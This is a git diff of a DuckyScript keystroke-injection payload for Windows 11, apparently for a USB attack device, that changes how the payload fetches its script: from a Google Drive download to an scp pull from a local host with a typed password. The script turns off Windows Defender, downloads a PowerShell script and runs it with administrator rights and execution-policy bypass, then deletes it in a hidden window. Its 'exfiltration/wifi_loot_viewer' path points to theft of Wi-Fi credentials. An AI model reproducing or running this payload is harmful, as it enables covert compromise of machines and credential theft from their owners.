@@ -5,7 +5,6 @@ REM Windows 11
 REM f3bandit
 REM ----------------------------------------------------------------------------------------------------------------
 DELAY 1000
-REM kills defender
 windows r
 DELAY 1000
 STRINGLN windowsdefender:
@@ -41,30 +40,28 @@ ALT F4
 DELAY 1000
 windows r
 DELAY 1000
-REM Replace <INSERT DL ID HERE> with the ID from your shared link.
-REM Share file on google drive, copy the link paste it into a browser
-REM But don't paste and go. look at the code between 1tIiD- and /view?
-REM That's your code. Make sure file is saved as .txt on drive.
-STRINGLN powershell -NoProfile -ExecutionPolicy Bypass -Command "New-Item -ItemType Directory -Path \"$env:TEMP\wifi\" -Force | Out-Null; curl \"https://drive.google.com/uc?export=download&id=1tIiD-<INSERT DL ID HERE>\" -o \"$env:TEMP\wifi\magic.txt\""
+STRINGLN cmd /c mkdir "%TEMP%\wifi" 2>nul
 DELAY 1000
 windows r
 DELAY 1000
-REM  Renames file to make it executable
-STRINGLN cmd /c "if exist %TEMP%\wifi\magic.txt rename %TEMP%\wifi\magic.txt magic.ps1"
+STRINGLN powershell -NoP -NoExit -Command "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@172.16.52.1:/mmc/root/payloads/user/exfiltration/wifi_loot_viewer/magic.ps1 \"$env:TEMP\wifi\magic.ps1\""
+DELAY 2000
+STRING 685876
+DELAY 2000
+ENTER
+DELAY 1000
+ALT F4
 DELAY 1000
 windows r
 DELAY 1000
-REM Runs the script
 STRINGLN powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoP -ExecutionPolicy Bypass -Command & \"%TEMP%\wifi\magic.ps1\"'"
-DELAY 1000
+DELAY 4000
 windows r
 DELAY 1000
-REM Cleans up
 STRINGLN powershell -Command "Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoP -NonI -Command Remove-Item -Path \"$env:TEMP\wifi\" -Recurse -Force'"
 DELAY 1000
 windows r
 DELAY 1000
-REM Re-enables defender
 STRINGLN windowsdefender:
 DELAY 1000
 TAB
